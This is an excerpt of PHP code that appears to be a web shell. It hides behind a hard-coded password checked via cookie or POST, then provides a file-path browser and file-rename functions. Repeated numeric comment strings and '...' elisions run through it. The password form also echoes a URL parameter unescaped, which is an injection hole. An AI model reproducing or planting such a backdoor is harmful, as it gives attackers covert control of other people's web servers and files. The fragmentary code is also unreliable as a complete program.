...
$auth_key = "79a45f52eb017b414d1814e9539a7582";
...
$pass = false;
if (isset($_COOKIE['pw_name_16901'])) {
    if(($_COOKIE['pw_name_16901']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_16901'])) {
        if(($_POST['pw_name_16901']) == $auth_key) {
            setcookie("pw_name_16901", $_POST['pw_name_16901']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_16901' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1739867532502500 1739867532684707 1739867532103038 1739867532265291
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1739867532502500 1739867532684707 1739867532103038 1739867532265291
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1739867532502500 1739867532684707 1739867532103038 1739867532265291
            $name = PATH . "/" . $_GET['r'];
